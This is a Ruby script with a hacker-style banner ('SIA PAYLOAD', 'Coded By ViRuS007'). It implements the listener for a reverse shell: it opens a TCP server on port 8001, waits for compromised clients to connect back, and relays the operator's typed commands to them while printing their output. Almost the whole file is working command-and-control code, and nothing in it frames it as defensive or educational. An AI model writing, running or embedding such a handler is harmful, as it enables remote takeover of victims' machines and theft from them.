#!/usr/bin/ruby

require "socket"
require "colorize"
require "timeout"

RS="\033[0m"    # reset
HC="\033[1m"    # hicolor
FRED="\033[31m" # foreground red
FGRN="\033[32m" # foreground green
FWHT="\033[37m" # foreground white

if RUBY_PLATFORM =~ /win32/
  system("cls")
else
  system("clear")
end

#press CTRL + C show message
trap("SIGINT") {
  puts "\n\n#{HC}#{FRED}WARNING! CTRL+C Detected closing Socket connection#{FWHT}.....#{RS}"
  exit 666
}

puts """

███████╗██╗ █████╗     ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
██╔════╝██║██╔══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
███████╗██║███████║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
╚════██║██║██╔══██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
███████║██║██║  ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝

                          Coded By ViRuS007
                    Email: virus007@protonmail.com

"""


port = 8001
puts "#{HC}#{FGRN}[+] Starting Server at port : #{port} #{RS}"
time = Time.now
puts "#{HC}#{FGRN}[+] Start at : #{time}#{RS}"
server = TCPServer.open(port)   # Socket to listen on port 2000
loop {                          # Servers run forever
  Thread.start(server.accept) do |client|
    puts "#{HC}[+] Client Connected!#{RS}"
    while true
      #if client is disconnected show this message
      puts "#{HC}#{FRED}[*] Client is Offline!#{RS}" if client.closed?

      print "\n[+] Enter Command : ".blue
      com = gets.chomp
      client.puts(com)
      
      puts "\n+------------------------------------------------------------+"
      #res = client.recv(10000).red
      begin
        Timeout::timeout(5) do
          res = client.recv(1000).red
          if res == ""
            print "\n[+] Enter Command : ".blue
            com = gets.chomp
            client.puts(com)
          #else
          else
            puts res
          end
          puts "+------------------------------------------------------------+\n"
        end

      rescue Timeout::Error
        #print "\n[+] Enter Command : ".blue
        #com = gets.chomp
        #client.puts(com)
      end
    end
  end
}
